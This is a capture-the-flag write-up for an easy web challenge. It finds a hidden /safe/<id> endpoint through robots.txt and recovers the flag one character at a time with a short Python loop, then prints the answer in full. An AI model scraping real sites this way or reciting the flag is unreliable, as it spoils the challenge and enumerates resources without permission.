---
layout: writeup

title: Reconfiguration Terminal
difficulty: Easy
points: 10
categories: [Web Exploitation]
tags: []

flag: CYS{7h3_h0ur6l455_5h4773r3d_bu7_m3m0ry_r3m41n5_1n_fr46m3n75_pl3453_l1573n_cl053r_65537_2025}
---

### Reconfiguration Terminal

* Author: Yashwant Gokul P

This is a web exploitation challenge involving predictable resource enumeration.

The hint:

```text
Numbers are truth, and truth always leaks through the cracks
```

suggests looking for numeric endpoints. Checking `robots.txt` reveals:

```text
Disallow: /safe/420
```

Testing `/safe/1`, `/safe/2`, and `/safe/3` returns individual characters from the flag, confirming that the `/safe/<id>` endpoint can be enumerated.

Instead of checking every page manually, we automate the requests and extract the character from each response until a `404` is reached.

```python
import requests
from bs4 import BeautifulSoup

BASE = "https://reconfiguration-terminal.netlify.app/safe/{}"
flag = ""

for i in range(1, 1000):
    r = requests.get(BASE.format(i))

    if r.status_code == 404:
        break

    soup = BeautifulSoup(r.text, "html.parser")
    p = soup.find("p")

    if p:
        flag += p.text.strip()

print(flag)
```

The enumeration reconstructs the complete flag.

### The flag would be:

## CYS{7h3_h0ur6l455_5h4773r3d_bu7_m3m0ry_r3m41n5_1n_fr46m3n75_pl3453_l1573n_cl053r_65537_2025}

